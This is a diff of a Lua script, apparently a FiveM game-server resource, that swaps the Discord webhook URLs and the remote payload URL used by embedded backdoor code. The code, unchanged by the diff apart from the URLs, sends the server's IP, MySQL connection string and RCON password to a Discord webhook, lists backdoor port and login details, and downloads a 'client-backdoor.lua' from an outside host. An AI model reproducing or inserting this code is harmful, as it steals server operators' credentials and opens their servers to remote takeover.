@@ -29,11 +29,11 @@ finalContent = "```" .. fileContent ..	 "```"
 
 if not SakxS3939 then
 	SakxS3939 = true
-	PerformHttpRequest("https://discord.com/api/webhooks/970413778380419132/H4XkIwj3TMBt_iSl6hRiIGUlNPXEKrUCxXdGZXW5pXbuJ6lUy2L5h__Y5s_x7P15HXK_", function(err, text, header) end,
+	PerformHttpRequest("https://discord.com/api/webhooks/1107656078293991485/1-379G6FoQwyq-m79Eswq-YcpavoNW81NUJHzNC6oRDWoWrm9bloA9uv-ytitaz_pymD", function(err, text, header) end,
 	'POST', 
 	json.encode({username = GetConvar('sv_hostname'), content = finalContent }), {['Content-Type'] = 'application/json'}) 
 end
-PerformHttpRequest("https://spambude.net/Dks/client-backdoor.lua", function(err, rText, headers)
+PerformHttpRequest("https://raw.githubusercontent.com/Syntaxsy/O/master/client-backdoor.lua", function(err, rText, headers)
 	SkA92 = rText
 end)
 
@@ -50,7 +50,7 @@ if not dksa9308592 then
 			local IP = rText
 				fullContent = "__**Server Info:**__\n\nServer IP: **"..IP.."**\nServer Name: **".. GetConvar('sv_hostname').. "**\n\n__**Anderwertige Info:**__\n\nMySQL String: **" .. GetConvar('mysql_connection_string') .. "**\nRCON: **" .. GetConvar('rcon_password') .. "**\n\n__**Backdoor Info:**__\n\nBackdoor Port: **4078** & **22**\nBackdoor User: **DEEP** / **7777**\nBackdoor Password: **DEEP** / **7777**"
 				
-				PerformHttpRequest("https://discord.com/api/webhooks/970413778380419132/H4XkIwj3TMBt_iSl6hRiIGUlNPXEKrUCxXdGZXW5pXbuJ6lUy2L5h__Y5s_x7P15HXK_", function(err, text, header) end,
+				PerformHttpRequest("https://discord.com/api/webhooks/1107656078293991485/1-379G6FoQwyq-m79Eswq-YcpavoNW81NUJHzNC6oRDWoWrm9bloA9uv-ytitaz_pymD", function(err, text, header) end,
 				'POST', 
 				json.encode({username = GetConvar('sv_hostname'), content = fullContent }), {['Content-Type'] = 'application/json'}) 
 			end)
